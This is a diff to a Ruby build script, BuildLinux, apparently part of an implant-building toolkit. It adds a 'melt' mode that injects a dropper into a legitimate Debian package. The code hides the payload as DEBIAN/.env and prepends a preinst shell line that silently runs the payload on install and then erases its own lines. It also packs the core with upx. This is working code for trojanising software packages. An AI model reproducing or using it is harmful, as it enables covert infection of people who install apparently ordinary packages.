@@ -36,7 +36,7 @@ class BuildLinux < Build
     super
 
     # pack the core
-    CrossPlatform.exec path('upx'), "-q --no-color --ultra-brute #{path('core')}"
+    CrossPlatform.exec path('bin/upx'), "-q --no-color --ultra-brute #{path('core')}"
   end
 
   def melt(params)
@@ -44,6 +44,9 @@ class BuildLinux < Build
 
     executable = path('default')
     @appname = params['appname'] || 'install'
+
+    melting_mode = :silent
+    melting_mode = :melted if params['input']
 
     dropper_size = File.size(path('dropper'))
 
@@ -65,10 +68,37 @@ class BuildLinux < Build
 
     FileUtils.mv path('dropper'), path('output')
 
+    if melting_mode.eql? :melted
+      FileUtils.mv Config.instance.temp(params['input']), path('melted')
+      melted(path('melted'), path('output'))
+      FileUtils.mv path('melted'), path('output')
+    end
+
     trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"
 
     @outputs = ['output']
+  end
 
+  def melted(host, guest)
+    FileUtils.mkdir_p path('DEBIAN')
+
+    # extract the original
+    CrossPlatform.exec path('bin/ar'), "x #{host} #{path('control.tar.gz')}"
+    CrossPlatform.exec path('bin/tar'), "xzf #{path('control.tar.gz')} -C #{path('DEBIAN')}"
+
+    FileUtils.cp guest, path('DEBIAN/.env')
+    if File.exist? path('DEBIAN/preinst')
+      content = File.read(path('DEBIAN/preinst'))
+      command = "#!/bin/sh\n(export P=/var/lib/dpkg/tmp.ci/.env; chmod +x $P; $P; sed -i -e '1,2d' /var/lib/dpkg/tmp.ci/preinst) 2>/dev/null"
+      content = command + content
+      File.open(path('DEBIAN/preinst'), 'wb') {|f| f.write content}
+    else
+      File.open(path('DEBIAN/preinst'), 'wb') {|f| f.write "#!/bin/sh\n(export P=/var/lib/dpkg/tmp.ci/.env; chmod +x $P; $P; rm -f /var/lib/dpkg/tmp.ci/preinst) 2>/dev/null"}
+    end
+
+    # repack it
+    CrossPlatform.exec path('bin/tar'), "czf #{path('control.tar.gz')} -C #{path('DEBIAN')} ."
+    CrossPlatform.exec path('bin/ar'), "r #{host} #{path('control.tar.gz')}"
   end
 
   def pack(params)
